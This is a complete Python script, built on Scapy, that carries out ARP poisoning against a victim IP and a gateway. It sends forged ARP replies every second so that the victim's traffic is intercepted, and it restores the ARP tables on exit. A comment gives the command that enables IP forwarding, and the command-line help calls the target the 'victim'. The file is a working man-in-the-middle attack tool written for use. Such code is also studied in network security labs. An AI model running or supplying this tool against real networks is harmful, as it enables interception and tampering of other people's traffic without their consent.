from scapy.all import Ether,ARP,srp,send
import argparse
import time 
import os

# Routing must be activated on your system (linux)
    # echo 1 > /proc/sys/net/ipv4/ip_forward

def get_mac(ip):
    """Returns MAC address of any device connected to the network"""

    #srp => send packet and keep listening for response
    res = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),timeout=3,verbose=False)[0]
    return res[0][1].hwsrc

def spoof(target_ip,host_ip,verbose=True):
    """ARP poisonning"""
    # Get @MAC of target
    target_mac = get_mac(target_ip)

    # Craft ARP "is-at" operation packet
        # We don't specify "hwsrc" (source MAC address )
            # Because by default it's already our real MAC@ 
    arp_resp = ARP(pdst=target_ip,hwdst=target_mac,psrc=host_ip,op='is-at')
    # Send the packet
    send(arp_resp, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] SENT to {} : {} is-at {} ".format(target_ip,host_ip,self_mac))

def restore(target_ip, host_ip, verbose=True):
    """Restore the original IP to the @MAC"""

    #get the real @MAC of the target
    target_mac = get_mac(target_ip)
    # Get the real @MAC of spoofed (ex : router)
    host_mac = get_mac(host_ip)

    #restoring packet
    arp_resp = ARP(pdst=target_ip,hwdst=target_mac,psrc=host_ip,hwsrc=host_mac,op='is-at')

    # Send restoring packet ( 7 times for a good measure )
    send(arp_resp,verbose=0,count=7)

    if verbose:
        print("[+] SENT to {} : {} is-at {} ".format(target_ip,host_ip,host_mac))

def arpspoof(target,host,verbose=True):
    try:
        while True:
            # Telling to the target that we are the host (host IP = our IP)
            spoof(target,host,verbose)

            #Telling to the host that we are the target
            spoof(host,target,verbose)

            time.sleep(1)
    except KeyboardInterrupt:
        print("^C Detected : program stopped")
        # Restoring the network
        restore(target,host)
        restore(host,target)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP spoof script")
    parser.add_argument("target", help="Victim IP address to ARP Poison")
    parser.add_argument("host", help="Host IP address  that you wish to intercept packets (gateway)")
    parser.add_argument("-v","--verbose", action="store_true", help="verbosity (simple msg each second)")
    args = parser.parse_args() 
    target, host, verbose = args.target, args.host, args.verbose

    #start the attack
    arpspoof(target,host,verbose)
